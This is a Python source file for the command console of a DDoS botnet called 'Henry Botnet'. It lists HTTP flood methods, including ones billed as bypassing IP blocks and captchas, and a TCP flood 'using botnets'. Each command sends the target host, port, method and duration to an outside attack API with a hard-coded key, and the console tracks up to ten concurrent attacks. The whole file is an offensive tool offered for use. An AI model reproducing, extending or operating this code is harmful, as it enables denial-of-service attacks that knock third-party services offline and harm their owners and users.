import os
import requests
import threading
import time
import sys

# Constants
MAX_TIME = 500 * 60  # 500 minutes in seconds
SLOT_MAX = 10
SLOT_USAGE = [None] * SLOT_MAX  # Track usage of slots with details

# Method mapping
METHOD_MAPPING = {
    "!https-flooder": "flooder",
    "!https-storm": "storm",
    "!https-henry": "https",
    "!https-bypass": "bypass",
    "!https-browser": "browser",
    "!tcp-rape": "raw"
}

# Clear console function
def clear_console():
    os.system('cls' if os.name == 'nt' else 'clear')

# Display help menu
def display_help():
    print(f"""
 Layer 7 Vector:
 !https-flooder     │ Flooder Hard Target Killer
 !https-storm       │ HTTP/1 + HTTP/2 Storm High Request-Per
 !https-henry       │ Simple HTTP/1 Using Raw
 !https-bypass      │ HTTP/2 Bypass Manager Block IP and Clf
 !https-browser     │ Browser Captcha - Trash Target
 Layer 4 Normal
 !tcp-rape          │ TCP Simple Using botnets High Gbit/s
 Commands:
 !ongoing           │ Show ongoing attack status
 !cls               | Back To Return Home
""")

# Display ongoing attack status
def display_ongoing_status():
    ongoing_attacks = [usage for usage in SLOT_USAGE if usage is not None]

    if ongoing_attacks:
        # Header
        print(f"{'Host':<30} {'Port':<5} {'Time':<5} {'Remaining':<10}")
        print(f"{'-' * 30} {'-' * 5} {'-' * 5} {'-' * 10}")
        for usage in ongoing_attacks:
            host, port, start_time, attack_time = usage
            elapsed_time = time.time() - start_time
            remaining_time = max(0, attack_time - int(elapsed_time))
            print(f"{host:<30} {port:<5} {attack_time:<5} {remaining_time:<10}")
    else:
        print("There are currently no ongoing attacks.")

# Perform attack based on command
def perform_attack(command):
    global SLOT_USAGE
    try:
        cmd_parts = command.split()
        method_key = cmd_parts[0]
        host = cmd_parts[1]
        port = cmd_parts[2]
        attack_time = int(cmd_parts[3])

        if method_key not in METHOD_MAPPING:
            print("Invalid method specified.")
            return
        
        method = METHOD_MAPPING[method_key]
        slot_index = SLOT_USAGE.index(None)  # Find the first available slot

        if slot_index < SLOT_MAX:
            SLOT_USAGE[slot_index] = (host, port, time.time(), attack_time)
            print("Attack Successfully Sent To All Server !!")
            requests.get(f'http://apiserveryour.com/api/attack?key=haibedz&host={host}&port={port}&method={method}&time={attack_time}')
            update_title()  # Update title after attack
            # Start a thread to remove the attack entry after the time has passed
            threading.Thread(target=remove_attack, args=(slot_index, attack_time)).start()
        else:
            print("All slots are in use.")
    except (IndexError, ValueError):
        print("Insufficient parameters or invalid time. Use: method host port time")

def remove_attack(slot_index, attack_time):
    """Remove attack details from the slot after the attack time has elapsed."""
    time.sleep(attack_time)
    SLOT_USAGE[slot_index] = None
    update_title()  # Update title after removing attack

# Update terminal window title with current slot usage
def update_title():
    slot_usage = SLOT_USAGE.count(None)
    sys.stdout.write(f"\x1b]2;Henry Botnet | Slot [{SLOT_MAX - slot_usage}/10]\x07")

# Main function
def main():
    clear_console()
    update_title()  # Set initial title
    print(f"""
         ,MMM8&&&.
    _...MMMMM88&&&&..._
 .::'''MMMMM88&&&&&&'''::.
::     MMMMM88&&&&&&     ::
'::....MMMMM88&&&&&&....::'
   `''''MMMMM88&&&&''''`
         'MMM8&&&'
""")

    while True:
        command = input('''root@Henry~$: ''')
        
        if command == "help":
            display_help()
        elif command == "cls":
            main()
        elif command == "exit":
            exit()
        elif command == "ongoing":
            display_ongoing_status()
        else:
            perform_attack(command)

if __name__ == "__main__":
    main()
